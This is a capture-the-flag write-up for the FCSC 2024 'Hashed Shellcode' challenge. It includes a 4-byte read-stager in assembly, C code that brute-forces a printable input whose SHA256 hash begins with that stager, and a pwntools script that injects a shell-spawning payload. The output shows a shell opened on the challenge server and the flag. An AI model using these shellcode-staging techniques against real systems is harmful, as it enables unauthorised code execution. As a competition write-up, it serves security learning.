# FCSC 2024 - Hashed Shellcode
This year's shellcoding exercise

## Overview
- We provide a 32bytes string that has to either be a prefix or start with `FCSC_`, and be entirely made of printable characters
- it is then hashed with the `SHA256` algorithm
- the resulting hashed is executed as shellcode

## Solve
- Since the area where the shellcode is stored is `RWX`, my approach was to design the smallest shellcode that could read another shellcode in the given context, then provide it with an  `execve(/bin/sh,NULL,NULL)` auto-generated with pwntools
- While the docker image was not provided at the time O was working on it, I guessed that it would be `debian:bookworm` or similar, based on the information available in the FAQ
- I checked the state of the registers before the shellcode is called, inside this docker image
- Turns out `$rdi`, and `$rax` are 0, while `$rdx` points to the start of the shellcode
- Thus to call `read(0,shellcode,some_big_number` it turns out 4 bytes are enough:
```asm
push rdx
pop rsi
syscall
```
- I then wrote, compiled and ran a small C script to generate a suitable string whose hash's first 4 bytes match the above shellcode:
```C
#include <openssl/sha.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void sha256_string(char *string, char *output) /* from https://stackoverflow.com/questions/2262386/generate-sha256-with-openssl-and-c */
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, string, strlen(string));
    SHA256_Final(output, &sha256);
}

const char alphabet [79] = "0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}";
const char target [4] = {0x52, 0x5e, 0x0f, 0x5};

int main() {
  char target [4] = {0x52, 0x5e, 0x0f, 0x5}; // push rdx; pop rsi; syscall
  char test[33];
  test[0] = 'F';
  test[1] = 'C';
  test[2] = 'S';
  test[3] = 'C';
  test[4] = '_';
  test[32] = 0;
  unsigned char idx[32];
  char hash[SHA256_DIGEST_LENGTH];
  int fd = open("/dev/urandom",O_RDONLY); // fastest way to read random indices that I figured out
  size_t l = strlen(alphabet);
  for(;;) {
    read(fd,&idx,32);
    for(int i = 5 ; i < 32 ; ++i) {
      test[i] = alphabet[idx[i]%l];
      sha256_string(test,hash);
    }
    //printf("%s\n",test);
    if(!strncmp(target,hash,4)) {
      printf("OK: %s\n",test);
      exit(1337);
    }
  }
}
```

- After a few minutes it outputed :
```
FCSC_A>Gu[63[t`?:cMA3[:Y9Y]]@aV{
```
- From there I just wrote a small solve script that sent this string, then a shellcode:
```python
io = start()
io.send(b"FCSC_A>Gu[63[t`?:cMA3[:Y9Y]]@aV{")
sleep(0.1)
io.sendline(flat({4:asm(shellcraft.sh())}))

io.interactive()
```

## FLAG
```
...# python3 solve.py
[*] '/home/skuuk/fcsc24/hsh/hashed-shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2107: Done
[*] Switching to interactive mode
Input:
$ ls
flag.txt
hashed-shellcode
$ cat flag.txt
FCSC{2bf3a8c59da61d5dd3ff402cb1ff11e0858246853297646bd1ad40bd944d8814}
```
